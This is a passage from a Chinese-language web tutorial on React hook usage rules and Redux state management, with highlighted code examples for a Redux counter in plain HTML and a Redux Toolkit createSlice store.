#569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">toggle</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">sendMsg</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is a React App.</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure></li><li><p>嵌套在 if 语句中</p><figure class="shiki jsx"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">useState</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"react"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">() {...</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">App</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">random</span><span style="color: #D4D4D4">() &gt; </span><span style="color: #B5CEA8">0.5</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 这将报错</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> [</span><span style="color: #4FC1FF">isShow</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">toggle</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">sendMsg</span><span style="color: #D4D4D4">] = </span><span style="color: #DCDCAA">useToggle</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">className</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"App"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">This is a React App.</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">App</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure></li></ol><h2 id="redux-html-小试牛刀"><a class="markdownIt-Anchor" href="#redux-html-小试牛刀"></a> Redux-html 小试牛刀</h2><p>Redux 是 React 最常用的集中状态管理工具，类似于 Vue 中的 Pinia（或者 Vuex），可以独立于框架运行<br>作用：通过集中管理的方式管理应用的状态</p><p>使用步骤：</p><ol><li>定义一个 reducer 函数（根据当前想要做的修改返回一个新的状态）</li><li>使用 createStore 方法传入 reducer 函数生成一个 store 实例对象</li><li>使用 store 实例的 subscribe 方法订阅数据的变化（数据一旦变化，可以得到通知）</li><li>使用 store 实例的 dispatch 方法提交 action 对象触发数据变化（告诉 reducer 你想怎么改数据）</li><li>使用 store 实例的 getState 方法获取最新的状态数据更新到视图中</li></ol><p>例如在 Html 中使用 redux，代码如下：</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;!</span><span style="color: #569CD6">DOCTYPE</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">html</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">html</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"en"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">head</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">meta</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">charset</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"UTF-8"</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">meta</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"viewport"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"width=device-width, initial-scale=1.0"</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Html Redux Example</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">head</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">body</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"increment"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Increment</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"counter"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">99</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"decrement"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">Decrement</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"https://cdnjs.cloudflare.com/ajax/libs/redux/4.0.5/redux.min.js"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">counter</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"counter"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// state管理数据的初始状态，action存放的是触发的动作</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">reducer</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4"> = { </span><span style="color: #9CDCFE">counter:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">textContent</span><span style="color: #D4D4D4">) },</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">action</span></span><span class="line"><span style="color: #D4D4D4">      ) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"INCREMENT"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">counter:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4"> + </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> }; </span><span style="color: #6A9955">// 不能直接修改state，需要基于原始的state创建一个新的对象</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"DECREMENT"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">counter:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4"> - </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> };</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 其他情况返回原来的state</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">store</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Redux</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">createStore</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">reducer</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 创建一个Redux的store</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">subscribe</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 每次state发生变化时，都调用这个函数</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">textContent</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getState</span><span style="color: #D4D4D4">().</span><span style="color: #9CDCFE">counter</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 更新页面上的counter</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">inBtn</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"increment"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">inBtn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"click"</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"INCREMENT"</span><span style="color: #D4D4D4"> }); </span><span style="color: #6A9955">// 触发action</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">deBtn</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"decrement"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">deBtn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"click"</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"DECREMENT"</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">body</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">html</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h2 id="redux-与-react"><a class="markdownIt-Anchor" href="#redux-与-react"></a> Redux 与 React</h2><p>在 React 中使用 redux，官方要求安装俩个其他插件：Redux Toolkit 和 react-redux</p><ul><li>Redux Toolkit（RTK）是官方推荐编写 Redux 逻辑的方式，是一套工具的集合集，<strong>简化书写方式</strong></li><li> react-redux 是用来链接 Redux 和 React 组件的中间件</li></ul><p>安装命令可以是：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955"># 创建项目</span></span><span class="line"><span style="color: #DCDCAA">npx</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">create-react-app</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">yourProjectName</span></span><span class="line"><span style="color: #6A9955"># 安装插件</span></span><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">i</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">@reduxjs/toolkit</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">react-redux</span></span></code></pre></div></div></figure><p>或者使用 vite 构建项目，命令可以是：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">create</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">vite@latest</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">my-vite-app</span></span></code></pre></div></div></figure><p>运行上述命令之后，按照提示选择 create-react-app 模板即可（SWC 是 JavaScript <a href="https://so.csdn.net/so/search?q=%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7&amp;spm=1001.2101.3001.7020">编译工具</a>比 Babel 要快，但是在功能和插件生态系统方面 Babel 更完善）。</p><h3 id="redux-目录结构安排"><a class="markdownIt-Anchor" href="#redux-目录结构安排"></a> Redux 目录结构安排</h3><p>安装好 Redux 后，应该对 sotre 目录结构有一定的安排，可以是：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411141957404.png" alt="image-20241114195752266"></p><p>index.js 将 modules 中的 store 导出即可，比较类似 Pinia 的目录安排。</p><h3 id="创建一个-countersotre"><a class="markdownIt-Anchor" href="#创建一个-countersotre"></a> 创建一个 counterSotre</h3><p>编写代码如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">createSlice</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@reduxjs/toolkit"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">counterStore</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">createSlice</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"counter"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">initialState:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">count:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">99</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 创建reducer的同时也会自动生成action creators</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">reducers:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 均是同步的，直接修改state</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">increment</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4">++;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">decrement</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4">--;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// action参数接受额外的参数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">incrementByAmount</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4"> += </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">payload</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">decrementByAmount</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4"> -= </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">action</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">payload</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">});</span></span><span class="line"><span style="color: #6A9955">// 解构方便导出使用</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">increment</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">decrement</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">incrementByAmount</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">decrementByAmount</span><span style="color: #D4D4D4"> } =</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">counterStore</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">actions</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">reducer</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">counterStore</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">reducer</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">increment</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">decrement</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">incrementByAmount</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">decrementByAmount</span><span style="color: #D4D4D4"> };</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">reducer</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><div class="note info flat"><p><em>info</em></p><ul><li>为什么创建 Store 的方法为 createSlice？</li></ul><p>因为在 Redux 中，"切片"（slice）是指将 Redux 状态的逻辑按照功能进行分割和组织的方式。每个切片通常包含以下几个部分：</p><ol><li><strong>初始状态</strong>：定义该切片的初始状态，通常是一个对象。</li><li><strong>reducers</strong>：一组用于更新该切片状态的函数。每个 reducer 函数定义了如何根据不同的 action 修改状态。</li><li><strong>actions</strong>：由 reducers 生成的操作，这些操作可以在组件中被触发，以更新状态。</li></ol><p>切片的主要目的是提高代码的可维护性和可读性，将不同功能的状态和行为组织到一个地方，避免将所有的状态和逻辑集中在一个大型文件中。这样可以使状态管理更加清晰和模块化。</p></div><h3 id="导出-store"><a class="markdownIt-Anchor" href="#导出-store"></a> 导出 store</h3><p>在 store 目录下的 index.js 文件中编写代码如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">configureStore</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@reduxjs/toolkit"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">counterReducer</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./modules/counterStore"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">store</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">configureStore</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">reducer:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">counter:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">counterReducer</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 该名称实际上是可以随意的</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">});</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: 